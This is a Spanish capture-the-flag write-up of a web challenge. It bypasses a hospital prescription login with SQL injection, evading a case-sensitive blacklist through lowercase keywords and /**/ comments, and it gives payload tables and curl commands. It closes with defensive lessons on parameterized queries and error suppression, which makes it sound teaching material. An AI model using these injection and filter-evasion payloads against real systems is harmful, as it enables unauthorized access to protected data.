# Desafío 49 — Sistema central de recetas (SQLi + filtro evadible)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / inyección SQL (bypass de autenticación) |
| Dificultad | fácil-media |
| Puntos | 401 (9 soluciones) |
| Objetivo | `http://203.0.113.10:8004` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> El módulo de recetas tiene un login "protegido por el filtro anti-inyección del SICH". Solo el rol jefatura ve la credencial. El filtro no es tan bueno como cree.

Comentario en el HTML (señuelo): `soporte: usuario temporal soporte / Hosp2029-tmp (deshabilitado, no usar)`.

## Reconocimiento

- `GET /` → login con `usuario` y `clave` (Flask/gunicorn).
- `admin/admin` y `soporte/Hosp2029-tmp` → «Acceso denegado :: credenciales invalidas.»
- Caracterización de la entrada:

| Payload en `usuario` | Respuesta |
|---|---|
| `admin' --` | «credenciales invalidas» (consulta válida, pero no existe `admin`) |
| `admin' #` | `Error de base de datos :: unrecognized token: "#"` → **SQLite** (`#` no es comentario) |
| `' OR 1=1 --` | «Entrada rechazada :: patron no permitido por el filtro.» |
| `' or 1=1 --` | **«Credencial de jefatura: …»** |

El error de SQLite confirma que la entrada se concatena en la consulta y que el motor es SQLite.

## Análisis

La consulta es del estilo:

```sql
SELECT rol, credencial FROM usuarios WHERE usuario = '<input>' AND clave = '<input>'
```

Inyectando `' or 1=1 --` se anula el `AND` y se comenta el resto: devuelve la primera fila de la
tabla (la de jefatura, que es la que interesa).

El «filtro anti-inyección» es una **lista negra sensible a mayúsculas**:

| Variante | Resultado |
|---|---|
| `' OR 1=1 --` | bloqueado |
| `' oR 1=1 --` | **pasa** |
| `' Or 1=1 --` | **pasa** |
| `' or 1=1 --` | **pasa** |
| `'/**/or/**/1=1--` | **pasa** (comentarios inline) |
| `' UNION SELECT 1,2,3--` | bloqueado por el filtro |
| `' union select 1,2,3--` | pasa y el motor responde `SELECTs to the left and right of UNION do not have the same number of result columns` (error de BD expuesto) |

Basta cambiar el caso de las palabras clave o intercalar comentarios `/**/` para evadir el filtro.

## Solución (pasos reproducibles)

```bash
BASE=http://203.0.113.10:8004

# Login normal (falla)
curl -s -d "usuario=admin&clave=admin" $BASE/ | grep -o 'Acceso denegado[^<]*'

# Bypass: el filtro solo bloquea las mayúsculas
curl -s --data-urlencode "usuario=' or 1=1 --" --data-urlencode "clave=x" $BASE/ \
  | grep -o 'cdm{[^}]*}'
```

Automatizado: `python scripts/solve.py` (prueba tres variantes de evasión y se queda con la flag).

```text
[*] usuario="' or 1=1 --" -> Credencial de jefatura:flag{ejemplo}
[+] FLAG: flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **Las listas negras no son un control de seguridad.** Un filtro que compara cadenas concretas
  (y encima distingue mayúsculas) se evade cambiando el caso, usando `/**/`, codificaciones o
  variantes del dialecto.
- La solución correcta es **consultas parametrizadas** (`?`/`:param` en SQLite), que tratan la
  entrada como dato y nunca como SQL.
- Los mensajes de error de la base («unrecognized token», «same number of result columns») filtran
  el motor y la estructura: hay que suprimirlos en producción.
- El comentario con credenciales «deshabilitadas» es un señuelo; no aportaba nada.
- Evidencia en `evidence/`: inicio, login normal, bloqueo del filtro, bypass en minúsculas (flag) y
  error de `UNION` del motor.
